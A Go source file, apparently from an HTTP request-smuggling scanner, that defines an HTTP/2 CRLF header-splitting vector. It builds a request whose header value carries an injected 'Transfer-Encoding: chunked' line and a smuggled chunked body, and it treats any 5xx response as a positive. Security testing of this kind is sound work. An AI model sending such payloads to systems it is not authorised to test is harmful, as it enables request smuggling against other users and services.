package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

type H2CRLFVector struct{}

func NewH2CRLFVector() *H2CRLFVector {
	return &H2CRLFVector{}
}

func (v *H2CRLFVector) Name() string {
	return "H2.CRLF (HTTP/2 Header Splitting via CRLF)"
}

func (v *H2CRLFVector) Type() VectorType {
	return "H2.CRLF"
}

func (v *H2CRLFVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// H2.CRLF
	// Inject CRLF into H2 header value.
	// When downgraded to H1, this splits the header and allows smuggling.

	// Example:
	// :path: /
	// foo: bar\r\nTransfer-Encoding: chunked

	// Downgraded H1:
	// GET / HTTP/1.1
	// Foo: bar
	// Transfer-Encoding: chunked

	payload := "0\r\n\r\nSMUGGLED"

	req1 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"Foo": "bar\r\nTransfer-Encoding: chunked",
		},
		Body: []byte(payload),
	}

	payloads = append(payloads, req1)
	return payloads
}

func (v *H2CRLFVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 500
}
